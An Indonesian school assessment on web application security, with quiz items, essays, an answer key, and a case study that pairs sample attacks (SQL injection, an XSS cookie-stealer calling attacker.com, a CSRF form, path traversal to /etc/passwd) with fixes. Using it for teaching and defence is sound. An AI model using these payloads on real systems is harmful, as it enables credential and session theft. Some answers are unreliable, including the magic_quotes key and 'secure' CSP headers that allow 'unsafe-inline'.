# 📝 Asesmen: Keamanan Aplikasi Web

## 🎯 Kompetensi Dasar
3.15 Menganalisis kerentanan aplikasi web
3.16 Menerapkan pengujian keamanan aplikasi web
3.17 Melakukan pengamanan aplikasi web

## 📝 Soal Pilihan Ganda

### 1. Manakah yang BUKAN termasuk dalam OWASP Top 10 2021?
   a) Injection  
   b) Broken Access Control  
   c) Buffer Overflow  
   d) Cryptographic Failures  
   
   **Jawaban: c) Buffer Overflow**  
   *Pembahasan: Buffer Overflow tidak termasuk dalam OWASP Top 10 2021. OWASP Top 10 2021 terdiri dari: 1) Broken Access Control, 2) Cryptographic Failures, 3) Injection, 4) Insecure Design, 5) Security Misconfiguration, 6) Vulnerable and Outdated Components, 7) Identification and Authentication Failures, 8) Software and Data Integrity Failures, 9) Security Logging & Monitoring Failures, 10) Server-Side Request Forgery (SSRF).*

### 2. Manakah pernyataan yang BENAR tentang Content Security Policy (CSP)?
   a) CSP hanya melindungi dari serangan XSS  
   b) CSP mengizinkan semua sumber eksternal secara default  
   c) CSP adalah header HTTP yang membatasi sumber daya yang dapat dimuat  
   d) CSP tidak kompatibel dengan browser modern  
   
   **Jawaban: c) CSP adalah header HTTP yang membatasi sumber daya yang dapat dimuat**  
   *Pembahasan: Content Security Policy (CSP) adalah header HTTP yang memungkinkan administrator web mengontrol sumber daya yang dapat dimuat oleh browser, membantu mencegah berbagai serangan termasuk XSS, clickjacking, dan injeksi kode lainnya.*

### 3. Manakah yang BUKAN praktik aman dalam menangani input pengguna?
   a) Validasi input di sisi klien  
   b) Validasi input di sisi server  
   c) Menggunakan parameterized queries  
   d) Menonaktifkan magic_quotes_gpc  
   
   **Jawaban: d) Menonaktifkan magic_quotes_gpc**  
   *Pembahasan: Magic quotes adalah fitur PHP lama yang secara otomatis melakukan escaping pada input pengguna. Fitur ini sudah tidak didukung di PHP versi terbaru dan tidak dianggap sebagai praktik keamanan yang baik. Sebaiknya gunakan parameterized queries atau prepared statements.*

## 📝 Soal Esai

### 1. Jelaskan perbedaan antara Cross-Site Scripting (XSS) dan Cross-Site Request Forgery (CSRF), serta berikan contoh mitigasi untuk masing-masing kerentanan tersebut!

**Jawaban:**

**Perbedaan XSS dan CSRF:**

| Aspek | XSS (Cross-Site Scripting) | CSRF (Cross-Site Request Forgery) |
|-------|---------------------------|----------------------------------|
| **Tujuan** | Mencuri data atau mengambil alih sesi pengguna | Melakukan aksi tidak sah atas nama pengguna |
| **Cara Kerja** | Menyisipkan script berbahaya ke halaman web | Memanfaatkan kepercayaan browser terhadap pengguna yang sudah login |
| **Korban** | Pengguna yang mengunjungi halaman yang terinfeksi | Situs web yang menjadi target |
| **Dampak** | Pencurian data, deface, dll. | Perubahan data, transfer dana, dll. |

**Contoh Mitigasi XSS:**
1. **Output Encoding**
   ```php
   // PHP
   echo htmlspecialchars($user_input, ENT_QUOTES, 'UTF-8');
   
   // JavaScript (Node.js)
   const safeOutput = userInput.replace(/[&<>"']/g, match => ({
     '&': '&amp;',
     '<': '&lt;',
     '>': '&gt;',
     '"': '&quot;',
     "'": '&#039;'
   }[match]));
   ```

2. **Content Security Policy (CSP)**
   ```http
   Content-Security-Policy: default-src 'self'; script-src 'self' 'unsafe-inline' cdn.example.com; style-src 'self' 'unsafe-inline'
   ```

**Contoh Mitigasi CSRF:**
1. **CSRF Tokens**
   ```html
   <form action="/transfer" method="POST">
     <input type="hidden" name="_csrf" value="a1b2c3d4e5f6">
     <input type="text" name="amount">
     <button type="submit">Transfer</button>
   </form>
   ```

2. **SameSite Cookie Attribute**
   ```php
   // Set cookie dengan atribut SameSite
   setcookie('session_id', $sessionId, [
       'expires' => time() + 3600,
       'path' => '/',
       'domain' => 'example.com',
       'secure' => true,
       'httponly' => true,
       'samesite' => 'Strict'
   ]);
   ```

### 2. Jelaskan apa yang dimaksud dengan "Insecure Direct Object References" (IDOR) dan bagaimana cara mencegahnya! Berikan contoh implementasi yang aman!

**Jawaban:**

**Pengertian IDOR:**
Insecure Direct Object References (IDOR) terjadi ketika aplikasi menggunakan input dari pengguna untuk mengakses objek secara langsung tanpa melakukan validasi otorisasi yang memadai. Ini memungkinkan penyerang memanipulasi referensi untuk mengakses data yang tidak seharusnya bisa diakses.

**Contoh Kerentanan IDOR:**
```
https://example.com/profile.php?user_id=123
```
Jika tidak ada validasi, pengguna bisa mengubah `user_id=123` menjadi `user_id=124` untuk melihat profil pengguna lain.

**Cara Mencegah IDOR:**

1. **Gunakan Indirect Object References**
   ```php
   // Sebelum (rentan)
   $user_id = $_GET['user_id'];
   $user = $db->query("SELECT * FROM users WHERE id = $user_id");
   
   // Sesudah (aman)
   $user_id = $_SESSION['user_id']; // Ambil dari session
   $user = $db->prepare("SELECT * FROM users WHERE id = ?");
   $user->execute([$user_id]);
   ```

2. **Validasi Izin Akses**
   ```php
   // Contoh validasi otorisasi
   function getUserProfile($requested_user_id) {
       $current_user_id = $_SESSION['user_id'];
       
       // Jika bukan admin dan mencoba mengakses profil orang lain
       if (!isAdmin() && $requested_user_id != $current_user_id) {
           throw new Exception('Unauthorized access');
       }
       
       // Lanjutkan pengambilan data
       $stmt = $db->prepare("SELECT * FROM users WHERE id = ?");
       $stmt->execute([$requested_user_id]);
       return $stmt->fetch();
   }
   ```

3. **Gunakan UUID atau Token yang Tidak Dapat Ditebak**
   ```php
   // Generate UUID untuk referensi
   function generateSecureReference($id) {
       $secret = 'your-secret-key';
       return hash_hmac('sha256', $id, $secret);
   }
   
   // Verifikasi referensi
   function verifyReference($id, $reference) {
       return hash_equals(generateSecureReference($id), $reference);
   }
   
   // Penggunaan
   $user_id = 123;
   $secure_ref = generateSecureReference($user_id);
   // URL menjadi: /profile?ref=abc123...
   
   // Saat memverifikasi
   if (verifyReference($user_id, $_GET['ref'])) {
       // Lanjutkan dengan akses aman
   }
   ```

## 📝 Studi Kasus: Keamanan Aplikasi E-Commerce

**Latar Belakang:**
Sebuah toko online memiliki fitur-fitur berikut:
- Login pengguna
- Pencarian produk
- Keranjang belanja
- Checkout dan pembayaran
- Riwayat transaksi
- Ulasan produk

**Pertanyaan:**
1. Identifikasi 5 potensi kerentanan keamanan yang mungkin ada pada aplikasi tersebut!
2. Jelaskan bagaimana cara mengeksploitasi masing-masing kerentanan tersebut!
3. Berikan rekomendasi untuk memperbaiki setiap kerentanan!

**Jawaban Contoh:**

1. **Kerentanan: SQL Injection pada Pencarian Produk**
   - **Eksploitasi:** 
     ```
     https://example.com/search?q=prod' UNION SELECT username, password FROM users--
     ```
   - **Rekomendasi:**
     ```php
     // Gunakan prepared statements
     $stmt = $pdo->prepare("SELECT * FROM products WHERE name LIKE ?");
     $searchTerm = "%" . $_GET['q'] . "%";
     $stmt->execute([$searchTerm]);
     ```

2. **Kerentanan: XSS pada Ulasan Produk**
   - **Eksploitasi:** 
     ```html
     <script>fetch('https://attacker.com/steal?cookie='+document.cookie)</script>
     ```
   - **Rekomendasi:**
     ```php
     // Gunakan output encoding
     echo htmlspecialchars($review['content'], ENT_QUOTES, 'UTF-8');
     
     // Tambahkan CSP header
     header("Content-Security-Policy: default-src 'self'; script-src 'self' 'unsafe-inline' https://trusted.cdn.com");
     ```

3. **Kerentanan: CSRF pada Checkout**
   - **Eksploitasi:**
     ```html
     <form action="https://example.com/checkout" method="POST">
       <input type="hidden" name="item" value="1">
       <input type="hidden" name="address" value="attacker_address">
     </form>
     <script>document.forms[0].submit()</script>
     ```
   - **Rekomendasi:**
     ```php
     // Tambahkan CSRF token
     $_SESSION['csrf_token'] = bin2hex(random_bytes(32));
     
     // Di form
     <input type="hidden" name="csrf_token" value="<?= $_SESSION['csrf_token'] ?>">
     
     // Validasi token saat submit
     if (!hash_equals($_SESSION['csrf_token'], $_POST['csrf_token'])) {
         die('CSRF token validation failed');
     }
     ```

4. **Kerentanan: IDOR pada Riwayat Transaksi**
   - **Eksploitasi:**
     ```
     https://example.com/order/1234
     Ganti 1234 dengan nomor order lain
     ```
   - **Rekomendasi:**
     ```php
     // Validasi kepemilikan order
     $order_id = $_GET['order_id'];
     $stmt = $pdo->prepare("SELECT * FROM orders WHERE id = ? AND user_id = ?");
     $stmt->execute([$order_id, $_SESSION['user_id']]);
     $order = $stmt->fetch();
     
     if (!$order) {
         die('Order not found or access denied');
     }
     ```

5. **Kerentanan: Insecure Direct Object Reference pada Gambar Produk**
   - **Ekspotitasi:**
     ```
     https://example.com/images/products/../../../../etc/passwd
     ```
   - **Rekomendasi:**
     ```php
     // Validasi path file
     $base_dir = '/var/www/example.com/images/products/';
     $file = $_GET['file'];
     $real_path = realpath($base_dir . $file);
     
     // Pastikan file ada di dalam direktori yang diizinkan
     if (strpos($real_path, $base_dir) !== 0 || !file_exists($real_path)) {
         die('File not found');
     }
     
     // Tentukan content type yang sesuai
     $finfo = finfo_open(FILEINFO_MIME_TYPE);
     $mime_type = finfo_file($finfo, $real_path);
     finfo_close($finfo);
     
     // Hanya izinkan tipe file gambar
     $allowed_types = ['image/jpeg', 'image/png', 'image/gif'];
     if (!in_array($mime_type, $allowed_types)) {
         die('Invalid file type');
     }
     
     // Tampilkan file
     header('Content-Type: ' . $mime_type);
     readfile($real_path);
     ```

## 📝 Tugas Praktik: Pengujian Keamanan Aplikasi Web

### Instruksi:
1. Install dan konfigurasi OWASP ZAP
2. Lakukan pemindaian keamanan pada aplikasi web yang rentan (contoh: DVWA, WebGoat, atau aplikasi yang disediakan)
3. Identifikasi minimal 3 kerentanan keamanan
4. Dokumentasikan langkah-langkah eksploitasi
5. Berikan rekomendasi perbaikan

### Format Laporan:

1. **Informasi Aplikasi**
   - Nama Aplikasi
   - Versi
   - Lingkungan Pengujian

2. **Metodologi Pengujian**
   - Tools yang Digunakan
   - Lingkungan Pengujian
   - Ruang Lingkup Pengujian

3. **Temuan Kerentanan**
   ```
   ### 1. [Nama Kerentanan]
   - **Tingkat Keparahan**: [High/Medium/Low]
   - **Deskripsi**: [Jelaskan kerentanan]
   - **Lokasi**: [URL/Halaman]
   - **Langkah Reproduksi**:
     1. [Langkah 1]
     2. [Langkah 2]
     3. [Langkah 3]
   - **Dampak**: [Jelaskan dampak yang mungkin terjadi]
   - **Rekomendasi**: [Berikan rekomendasi perbaikan]
   - **Referensi**: [OWASP, CVE, dll.]
   ```

4. **Kesimpulan dan Rekomendasi**
   - Ringkasan temuan
   - Rekomendasi umum peningkatan keamanan
   - Saran untuk pengujian keamanan rutin

### Rubrik Penilaian Praktik:
| Kriteria | Skor | Deskripsi |
|----------|------|-----------|
| Kelengkapan Pengujian | 25% | Semua aspek penting tercakup |
| Kedalaman Analisis | 30% | Kedalaman analisis setiap temuan |
| Rekomendasi | 25% | Kualitas dan relevansi rekomendasi |
| Dokumentasi | 20% | Kerapian dan kejelasan laporan |

## 📊 Kunci Jawaban dan Pembahasan

### Kunci Pilihan Ganda
1. c) Buffer Overflow
2. c) CSP adalah header HTTP yang membatasi sumber daya yang dapat dimuat
3. d) Menonaktifkan magic_quotes_gpc

### Pedoman Penskoran Esai
1. **Kelengkapan Jawaban** (40%): Semua poin penting tercakup
2. **Ketepatan Konsep** (30%): Penjelasan konsep yang akurat
3. **Contoh Implementasi** (20%): Contoh yang diberikan relevan dan aplikatif
4. **Struktur Jawaban** (10%): Sistematika penyampaian yang baik

## 📚 Referensi
1. OWASP Top 10 2021: https://owasp.org/Top10/
2. OWASP Testing Guide: https://owasp.org/www-project-web-security-testing-guide/
3. Web Security Academy: https://portswigger.net/web-security
4. Mozilla Web Security Guidelines: https://infosec.mozilla.org/guidelines/web_security.html

---
<div align="center">
  <p>Dokumen Asesmen - Keamanan Aplikasi Web</p>
  <p>© 2025 SMKN 1 Punggelan - Program Keahlian Teknik Komputer dan Jaringan</p>
</div>
